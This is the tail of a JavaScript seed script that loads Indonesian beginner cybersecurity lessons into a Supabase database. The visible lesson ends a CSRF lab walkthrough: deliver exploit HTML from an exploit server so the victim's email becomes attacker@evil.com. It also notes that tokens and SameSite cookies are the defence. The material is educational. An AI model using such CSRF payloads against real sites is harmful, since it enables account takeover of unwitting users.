  &lt;/body&gt;
&lt;/html&gt;`)}</li>
<li style="margin-bottom:0.4rem;">Di lab → klik tombol <strong>Go to exploit server</strong></li>
<li style="margin-bottom:0.4rem;">Paste HTML di kolom Body → klik <strong>Deliver exploit to victim</strong></li>
<li>Email carlos berubah ke attacker@evil.com tanpa carlos melakukan apapun → Lab solved ✓</li>
</ol>
${note("⭐ CSRF hanya bisa dicegah dengan CSRF token yang unik per-session dan divalidasi server, atau header <code>SameSite=Strict</code> pada cookie. Tanpa keduanya, setiap form rentan.", "#FFF3D6", "#F5A62A")}
<div style="background:linear-gradient(135deg,#2D5016,#4A7C2F);border-radius:12px;padding:1.2rem;margin:1rem 0;text-align:center;">
<p style="margin:0 0 0.3rem;font-size:1rem;font-weight:800;color:white;">🎉 Semua Bonus Lab Selesai!</p>
<p style="margin:0;font-size:0.87rem;color:rgba(255,255,255,0.85);">SQL Injection · XSS · Authentication · Access Control · Path Traversal · CSRF — kamu sudah buktikan semuanya di lab nyata.</p>
</div>`)}
</div>`
}

]; // end articles

async function main() {
  for (const a of articles) {
    const { data, error } = await supabase
      .from("materials")
      .insert({
        course_slug: "cyber-security-pemula",
        title: a.title,
        content: a.content,
        video_url: null,
        module_index: a.module_index,
        order_index: a.order_index,
      })
      .select("id, title, module_index, order_index")
      .single();

    if (error) {
      console.error(`❌ [mod:${a.module_index} ord:${a.order_index}] ${a.title}\n   ${error.message}`);
    } else {
      console.log(`✅ [mod:${data.module_index} ord:${data.order_index}] ${data.title}`);
    }
  }

  console.log("\n📋 Final check Modul 8 (Bonus):");
  const { data } = await supabase
    .from("materials")
    .select("title, order_index")
    .eq("course_slug", "cyber-security-pemula")
    .eq("module_index", 8)
    .order("order_index");
  data?.forEach(m => console.log(`  [${m.order_index}] ${m.title}`));
}

main();
